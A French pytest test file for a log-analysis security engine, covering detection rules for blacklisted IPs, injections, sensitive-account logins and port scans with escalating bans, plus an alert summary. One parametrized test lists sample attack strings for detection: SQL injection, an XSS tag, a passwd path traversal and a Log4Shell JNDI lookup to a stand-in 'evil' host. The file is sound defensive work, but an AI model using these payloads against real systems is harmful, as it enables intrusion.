"""Tests du Module 4 : moteur de règles et bilan des alertes."""

import copy
import logging
import tracemalloc
from datetime import datetime, timedelta

import pytest

from moteur_traitement.rules import (
    DEFAULT_BAN_STEPS,
    AlertSummary,
    PortScanRule,
    apply_security_rules,
    ban_duration,
    rule_blacklisted_ip,
    rule_critical_level,
    rule_injection,
    rule_sensitive_account,
)

T0 = datetime(2026, 1, 1)
ALERT_KEYS = {"rule", "severity", "timestamp", "ip", "user", "detail"}


def make_record(**changes):
    """Record banal, modifié par les arguments donnés."""
    record = {
        "timestamp": T0,
        "level": "INFO",
        "ip": "8.8.8.8",
        "user": "alice1",
        "payload": "kernel: eth0 link up",
        "connection": None,
    }
    record.update(changes)
    return record


def login(ip, user, status):
    """Record d'une connexion SSH."""
    payload = {"action": "login", "status": status, "port": 22}
    return make_record(ip=ip, user=user, payload=payload)


def blocked(ip, port, when=T0):
    """Record d'une connexion bloquée par le pare-feu."""
    payload = {"action": "connect", "status": "blocked", "port": port}
    return make_record(
        timestamp=when,
        level="WARNING",
        ip=ip,
        user=None,
        payload=payload,
        connection=(ip, port, "TCP"),
    )


def run_scan(rule, ip, when, nb_ports=10, **config):
    """Envoie nb_ports connexions bloquées et renvoie les alertes."""
    alerts = []
    for i in range(nb_ports):
        record = blocked(ip, 1000 + i, when + timedelta(seconds=i))
        alert = rule(record, **config)
        if alert is not None:
            alerts.append(alert)
    return alerts


def make_alert(rule, severity, ip):
    """Alerte minimale pour tester AlertSummary."""
    return {
        "rule": rule,
        "severity": severity,
        "timestamp": T0,
        "ip": ip,
        "user": None,
        "detail": "",
    }


# Règles simples


def test_blacklisted_ip_alerte():
    alert = rule_blacklisted_ip(
        make_record(ip="6.6.6.6"), blacklist=frozenset({"6.6.6.6"})
    )
    assert alert["rule"] == "blacklisted_ip"
    assert set(alert) == ALERT_KEYS


def test_blacklisted_ip_ignore_ip_propre():
    record = make_record(ip="8.8.8.8")
    assert rule_blacklisted_ip(record, blacklist=frozenset()) is None


def test_blacklisted_ip_sans_blacklist_leve_une_erreur():
    with pytest.raises(KeyError):
        rule_blacklisted_ip(make_record())


@pytest.mark.parametrize(
    "content, kind",
    [
        ("' OR 1=1 --", "SQL"),
        ("; DROP TABLE users;", "SQL"),
        ("<script>alert(1)</script>", "XSS"),
        ("../../ETC/PASSWD", "path_traversal"),
        ("${jndi:ldap://evil/a}", "Log4Shell"),
    ],
)
def test_injection_detectee_par_motif(content, kind):
    # Pas de clé « attack » : la règle lit le contenu lui-même.
    record = make_record(payload={"content": content, "url": "/login"})
    alert = rule_injection(record)
    assert alert["severity"] == "HIGH"
    assert alert["detail"].startswith(kind)
    assert alert["detail"].endswith("sur /login")


def test_injection_sur_un_vrai_record(injection_record):
    assert rule_injection(injection_record)["rule"] == "injection"


def test_injection_dans_un_payload_texte():
    assert rule_injection(make_record(payload="GET /?q=<script>")) is not None


def test_injection_ignore_les_records_normaux(sample_records):
    assert all(rule_injection(r) is None for r in sample_records)


def test_compte_sensible_depuis_l_exterieur():
    alert = rule_sensitive_account(login("8.8.8.8", "root", "success"))
    assert alert["rule"] == "sensitive_account"


def test_compte_sensible_mal_ecrit_reconnu():
    record = login("8.8.8.8", '"ROOT"', "SUCCESS")
    assert rule_sensitive_account(record) is not None


@pytest.mark.parametrize(
    "ip, user, status",
    [
        ("192.168.1.10", "root", "success"),  # réseau interne
        ("8.8.8.8", "root", "failed"),  # connexion ratée
        ("8.8.8.8", "alice1", "success"),  # compte normal
        ("8.8.8.8", None, "success"),  # pas d'utilisateur
    ],
)
def test_compte_sensible_sans_alerte(ip, user, status):
    assert rule_sensitive_account(login(ip, user, status)) is None


def test_compte_sensible_liste_reglable():
    record = login("8.8.8.8", "alice1", "success")
    alert = rule_sensitive_account(record, sensitive_accounts={"alice1"})
    assert alert is not None


def test_critical_level(sample_records):
    alerts = [rule_critical_level(r) for r in sample_records]
    assert [a["rule"] for a in alerts if a] == ["critical_level"]


# Scan de ports et sanctions


def test_scan_9_ports_ne_declenche_rien():
    assert run_scan(PortScanRule(), "6.6.6.6", T0, nb_ports=9) == []


def test_scan_10_ports_declenche_une_alerte():
    alerts = run_scan(PortScanRule(), "6.6.6.6", T0)
    assert len(alerts) == 1
    assert "scan n°1" in alerts[0]["detail"]
    assert "24 h" in alerts[0]["detail"]


def test_scan_meme_port_compte_une_fois():
    rule = PortScanRule()
    for _ in range(20):
        assert rule(blocked("6.6.6.6", 22)) is None


def test_scan_ignore_pendant_la_sanction():
    rule = PortScanRule()
    run_scan(rule, "6.6.6.6", T0)
    assert run_scan(rule, "6.6.6.6", T0 + timedelta(hours=2)) == []


def test_scan_ignore_les_connexions_autorisees():
    record = blocked("6.6.6.6", 22)
    record["payload"]["status"] = "success"
    assert PortScanRule()(record) is None


@pytest.mark.parametrize(
    "offense, expected",
    [
        (1, timedelta(hours=24)),
        (2, timedelta(hours=48)),
        (3, timedelta(weeks=1)),
        (4, timedelta(days=30)),
        (5, timedelta(days=60)),
        (6, timedelta(days=120)),
    ],
)
def test_echelle_des_sanctions(offense, expected):
    assert ban_duration(offense, DEFAULT_BAN_STEPS) == expected


def test_recidive_allonge_la_sanction():
    rule = PortScanRule()
    run_scan(rule, "6.6.6.6", T0)
    alerts = run_scan(rule, "6.6.6.6", T0 + timedelta(hours=25))
    assert "scan n°2" in alerts[0]["detail"]
    assert rule.banned_until["6.6.6.6"] > T0 + timedelta(hours=72)


def test_recidives_oubliees_apres_6_mois():
    rule = PortScanRule()
    run_scan(rule, "6.6.6.6", T0)
    alerts = run_scan(rule, "6.6.6.6", T0 + timedelta(days=200))
    assert "scan n°1" in alerts[0]["detail"]


def test_bans_classe_les_recidivistes():
    rule = PortScanRule()
    run_scan(rule, "1.1.1.1", T0)
    run_scan(rule, "6.6.6.6", T0)
    run_scan(rule, "6.6.6.6", T0 + timedelta(days=2))
    assert [b["ip"] for b in rule.bans()] == ["6.6.6.6", "1.1.1.1"]


# Moteur


def test_moteur_sans_regle_leve_une_erreur():
    with pytest.raises(ValueError):
        apply_security_rules(blacklist=frozenset())


def test_moteur_donne_la_config_a_chaque_regle():
    seen = []

    def spy(record, **config):
        seen.append(config)

    check = apply_security_rules(spy, spy, seuil=3)
    check(make_record())
    assert seen == [{"seuil": 3}, {"seuil": 3}]


def test_moteur_renvoie_les_alertes_de_toutes_les_regles(injection_record):
    check = apply_security_rules(
        rule_blacklisted_ip,
        rule_injection,
        rule_critical_level,
        blacklist=frozenset({injection_record["ip"]}),
    )
    rules = [a["rule"] for a in check(injection_record)]
    assert rules == ["blacklisted_ip", "injection"]


def test_moteur_ne_modifie_pas_les_records(sample_records):
    before = copy.deepcopy(sample_records)
    check = apply_security_rules(
        rule_blacklisted_ip,
        rule_injection,
        rule_sensitive_account,
        rule_critical_level,
        PortScanRule(),
        blacklist=frozenset({"77.185.106.206"}),
    )
    for record in sample_records:
        check(record)
    assert sample_records == before


def test_moteur_ne_logue_pas_a_chaque_record(caplog):
    caplog.set_level(logging.DEBUG, logger="moteur_traitement.rules")
    check = apply_security_rules(rule_critical_level)
    for _ in range(100):
        check(make_record())
    assert len(caplog.records) == 1


# Bilan des alertes


def test_bilan_compte_toutes_les_alertes():
    summary = AlertSummary()
    summary.update([make_alert("injection", "HIGH", "6.6.6.6")])
    summary.update([make_alert("blacklisted_ip", "MEDIUM", "6.6.6.6")])
    assert summary.total == 2
    assert summary.by_severity == {"HIGH": 1, "MEDIUM": 1}


def test_bilan_garde_20_exemples_au_plus():
    summary = AlertSummary()
    for _ in range(50):
        summary.update([make_alert("injection", "HIGH", "6.6.6.6")])
    assert summary.by_rule["injection"] == 50
    assert len(summary.samples["injection"]) == 20


def test_score_compte_chaque_regle_une_seule_fois():
    summary = AlertSummary()
    for _ in range(254):
        summary.update([make_alert("blacklisted_ip", "MEDIUM", "6.6.6.6")])
    assert summary.top_ips()[0]["score"] == 2


def test_top_ips_met_les_attaquants_varies_en_tete():
    summary = AlertSummary()
    for _ in range(100):
        summary.update([make_alert("blacklisted_ip", "MEDIUM", "1.1.1.1")])
    summary.update([make_alert("injection", "HIGH", "6.6.6.6")])
    summary.update([make_alert("blacklisted_ip", "MEDIUM", "6.6.6.6")])
    assert [ip["ip"] for ip in summary.top_ips()] == ["6.6.6.6", "1.1.1.1"]
    assert summary.multi_rule_ips() == 1


def test_bilan_exportable():
    summary = AlertSummary()
    summary.update([make_alert("injection", "HIGH", "6.6.6.6")])
    data = summary.as_dict()
    assert data["ips_count"] == 1
    assert data["top_ips"][0]["rules"] == {"injection": 1}


def test_bilan_memoire_bornee():
    summary = AlertSummary()
    tracemalloc.start()
    for i in range(200_000):
        ip = f"10.0.{i % 3500 // 250}.{i % 250}"
        summary.update([make_alert("injection", "HIGH", ip)])
    peak = tracemalloc.get_traced_memory()[1]
    tracemalloc.stop()
    assert summary.total == 200_000
    assert peak < 5_000_000
